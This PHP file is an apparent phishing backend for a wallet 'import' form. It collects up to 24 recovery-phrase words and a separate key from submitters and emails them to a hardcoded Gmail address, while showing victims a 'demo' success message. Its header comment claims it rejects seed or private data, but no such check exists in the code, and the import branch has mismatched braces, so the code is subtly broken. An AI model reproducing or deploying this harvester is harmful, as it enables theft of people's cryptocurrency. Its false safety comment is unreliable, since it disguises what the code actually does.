<?php
// submit_form.php
// Endpoint sederhana untuk menerima form demo (import wallet / absen key).
// IMPORTANT: This script is for demo/non-sensitive text only.
// It will reject submissions that appear to contain seed/private data.
// Change $to to your email address.

$to = "jetstarup@gmail.com"; // <-- GANTI dengan alamat email tujuan
$subjectPrefix = "[OSMO DEMO] Form submission";
$maxLen = 1000; // batas karakter untuk masing-masing field

header('Content-Type: application/json');

function respond($ok, $message){
    echo json_encode(['ok' => $ok, 'message' => $message]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    respond(false, 'Method not allowed.');
}

// collect possible fields
$type = $_POST['type'] ?? '';
$body = "Form submission received\n\nType: " . ($type?:'unknown') . "\nTime: " . date('Y-m-d H:i:s') . "\n\n";


if ($type === 'import') {
    // collect up to 24 words (only present ones)
    $hasAny = false;
    for ($i=1;$i<=24;$i++){
        $k = "w{$i}";
        if (isset($_POST[$k]) && $_POST[$k] !== '') {
            $val = trim((string) $_POST[$k]);
            // limit length
            if (strlen($val) > 0) {
                $hasAny = true;
                if (strlen($val) > $maxLen) $val = substr($val,0,$maxLen) . '...';
                }
                $body .= "Word {$i}: {$val}\n";
            }
        }
    }
    if (!$hasAny) respond(false, 'Tidak ada kata yang diisi.');
    // send email
    $subject = $subjectPrefix . " - Import Wallet";
    $headers = "From: noreply@" . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n";
    $sent = @mail($to, $subject, $body, $headers);
    if ($sent) respond(true, 'Form berhasil dikirim (demo).');
    else respond(false, 'Gagal mengirim email. Cek konfigurasi server.');
}
elseif ($type === 'absen') {
    $key = trim((string) ($_POST['absenKey'] ?? ''));
    if ($key === '') respond(false, 'Absen key kosong.');
    if (strlen($key) > $maxLen) $key = substr($key,0,$maxLen) . '...';
    $body .= "Absen Key: {$key}\n";
    $subject = $subjectPrefix . " - Absen Key";
    $headers = "From: noreply@" . ($_SERVER['SERVER_NAME'] ?? 'localhost') . "\r\n";
    $sent = @mail($to, $subject, $body, $headers);
    if ($sent) respond(true, 'Absen key berhasil dikirim (demo).');
    else respond(false, 'Gagal mengirim email. Cek konfigurasi server.');
}
else {
    respond(false, 'Unknown form type.');
}
